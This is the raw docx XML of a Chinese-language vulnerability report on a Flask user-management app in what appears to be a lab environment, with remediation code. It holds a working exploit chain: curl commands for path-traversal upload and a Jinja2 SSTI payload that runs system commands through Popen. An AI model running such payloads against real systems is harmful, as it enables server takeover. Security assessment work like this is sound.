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用户管理系统 - Upload 功能漏洞分析报告</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>项目: 192.168.119.128:5000 用户管理系统</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>分析时间: 2026-07-09</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>仓库: github.com/7geyouzi/day2</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. 概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>本系统是一个基于 Flask 的用户管理 Web 应用，包含登录、注册、搜索、头像上传等功能。其中 /upload 路由和 /uploads/ 静态文件服务存在多个高危漏洞，可导致远程代码执行（RCE）、任意文件读取和服务器沦陷。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. 漏洞总览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影响范围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严重等级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影响范围</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>V1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>任意文件上传 (Unrestricted File Upload)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上传任意类型文件（含 .html/.php/.py）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>V2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>路径穿越 (Path Traversal)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上传文件到任意目录</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>V3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>无文件类型/MIME 检查</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🟠 高危</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>绕过安全限制</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>V4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>SSTI 模板注入 (SSTI RCE)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🔴 严重</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>上传恶意 .html → /view/ 渲染 → RCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>V5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>敏感文件直接访问</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🟡 中危</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>泄露上传的敏感文件内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. 漏洞详解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>V1: 任意文件上传</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">严重等级: </w:t>
      </w:r>
      <w:r>
        <w:t>🔴 严重</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">漏洞位置: </w:t>
      </w:r>
      <w:r>
        <w:t>app.py — /upload POST 处理（约第181-210行）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>代码没有对上传文件的扩展名做任何检查。ALLOWED_EXTENSIONS 变量虽然存在，但在新 upload() 函数中完全没有被使用。用户可上传 .html、.php、.py、.jsp、.war、.exe 等任意类型文件。原有的 allowed_file() 函数也没有被调用。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">攻击方式: </w:t>
      </w:r>
      <w:r>
        <w:t>直接上传 Python WebShell、PHP Webshell 或恶意 HTML 模板文件。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>V2: 路径穿越</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">严重等级: </w:t>
      </w:r>
      <w:r>
        <w:t>🔴 严重</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">漏洞位置: </w:t>
      </w:r>
      <w:r>
        <w:t>app.py — /upload POST 处理（文件名拼接与保存部分）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>虽然使用了 os.path.normpath()，但没有验证最终路径是否仍在 UPLOAD_DIR 内。攻击者可以通过 filename 中的 ../ 实现目录穿越，将文件写入任意位置。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">攻击示例: </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 向 templates/ 目录写入恶意模板文件</w:t>
        <w:br/>
        <w:t>curl -X POST \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -F "file=@evil.html;filename=../../templates/evil.html" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -b "session=..." \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  http://192.168.119.128:5000/upload</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>V3: 无文件类型/MIME 检查</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">严重等级: </w:t>
      </w:r>
      <w:r>
        <w:t>🟠 高危</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>旧的 allowed_file() 函数已经是个假检查（允许 html、php、phtml 等危险后缀），但新 /upload 路由甚至连这个假检查都没调用：</w:t>
        <w:br/>
        <w:t>• 没有检查 Content-Type</w:t>
        <w:br/>
        <w:t>• 没有检查文件魔数（magic bytes）</w:t>
        <w:br/>
        <w:t>• 没有检查文件扩展名</w:t>
        <w:br/>
        <w:t>• 文件名完全由客户端控制</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>V4: SSTI 模板注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">严重等级: </w:t>
      </w:r>
      <w:r>
        <w:t>🔴 严重</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">攻击链: </w:t>
      </w:r>
      <w:r>
        <w:t>V1 任意文件上传 → V2 路径穿越 → 写入 Jinja2 模板 → SSTI RCE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Flask 使用 Jinja2 模板引擎渲染 .html 文件。系统内置 view_template 路由：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>@app.route("/view/&lt;path:filename&gt;")</w:t>
        <w:br/>
        <w:t>def view_template(filename):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """渲染任意模板文件 — 高危漏洞"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return render_template(filename)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>如果攻击者上传一个包含 Jinja2 模板代码的 .html 文件到 templates/ 目录，然后访问 /view/evil.html，就会触发模板引擎执行其中的代码，实现 RCE。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>攻击步骤:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>上传恶意 .html 文件（利用 V2 路径穿越写入 templates/）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>访问 /view/evil.html 触发 SSTI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>通过 SSTI 执行系统命令（反弹 shell、写 SSH 密钥等）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>V5: 敏感文件直接访问</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">严重等级: </w:t>
      </w:r>
      <w:r>
        <w:t>🟡 中危</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>send_from_directory 路由没有访问权限控制，任何知道文件路径的人都可以下载。结合路径穿越漏洞（V2），攻击者可以将敏感文件上传后读取。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. 攻击链实战</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>完全接管服务器的攻击链：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>登录（获得 session）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>POST /upload 上传恶意 .html 模板（路径穿越写入 templates/）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>GET /view/evil.html 触发 SSTI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>通过 SSTI 执行系统命令（反弹 Shell / 写入 SSH 公钥）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>服务器被完全控制</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>实战 curl 演示:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># 1. 登录获取 session</w:t>
        <w:br/>
        <w:t>curl -c cookies.txt -X POST \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "username=admin&amp;password=***" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  http://192.168.119.128:5000/login</w:t>
        <w:br/>
        <w:br/>
        <w:t># 2. 写入 SSTI payload 到 templates/</w:t>
        <w:br/>
        <w:t>echo '{% for x in ().__class__.__base__.__subclasses__() %}{% if "Popen" in x.__name__ %}{{ x("id", shell=True, stdout=-1).communicate()[0].decode() }}{% endif %}{% endfor %}' &gt; /tmp/pwn.html</w:t>
        <w:br/>
        <w:br/>
        <w:t>curl -b cookies.txt -X POST \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -F "file=@/tmp/pwn.html;filename=../../templates/pwn.html" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  http://192.168.119.128:5000/upload</w:t>
        <w:br/>
        <w:br/>
        <w:t># 3. 触发 SSTI RCE</w:t>
        <w:br/>
        <w:t>curl http://192.168.119.128:5000/view/pwn.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. 修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 禁止任意文件上传（修复 V1）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>只允许图片后缀（png/jpg/jpeg/gif），使用 allowed_file() 函数检查。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 修复路径穿越（修复 V2）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>使用 werkzeug.utils.secure_filename() 清理文件名，只保留纯文件名部分，去除所有路径分隔符。同时用 os.path.realpath() 验证最终路径在 UPLOAD_DIR 内。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>from werkzeug.utils import secure_filename</w:t>
        <w:br/>
        <w:br/>
        <w:t>safe_name = secure_filename(filename)</w:t>
        <w:br/>
        <w:t>if not safe_name:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return "无效文件名", 400</w:t>
        <w:br/>
        <w:br/>
        <w:t>real_upload = os.path.realpath(UPLOAD_DIR)</w:t>
        <w:br/>
        <w:t>real_save = os.path.realpath(os.path.join(UPLOAD_DIR, safe_name))</w:t>
        <w:br/>
        <w:t>if not real_save.startswith(real_upload + os.sep):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return "非法路径", 400</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.3 文件类型/MIME 校验（修复 V3）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>通过检查文件魔数（magic bytes）验证文件真实类型，防止伪装文件上传。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.4 删除危险的 /view/ 路由（修复 V4）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>高危操作：立即注释或删除 view_template() 函数。如果需要模板预览，使用白名单限制。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.5 综合修复优先级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修复项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紧急程度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删除 /view/&lt;path:filename&gt; 路由</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🚨 立即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在 upload() 中使用 secure_filename()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🚨 立即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添加文件后缀白名单检查</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>⚠️ 尽快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添加魔数校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>⚠️ 尽快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添加上传文件访问权限控制</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>ℹ️ 建议</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. 总结</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>该用户管理系统的 /upload 功能存在 4 个高危/严重漏洞，组合后可形成完整的攻击链：</w:t>
        <w:br/>
        <w:br/>
        <w:t>任意文件上传 → 路径穿越写入模板 → SSTI 模板注入 → 远程命令执行 → 服务器完全沦陷</w:t>
        <w:br/>
        <w:br/>
        <w:t>该漏洞链的危害等级为严重（Critical），建议立即按照修复优先级进行修补。</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>本报告由 金柚子 🍊 自动生成</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>仓库: github.com/7geyouzi/day2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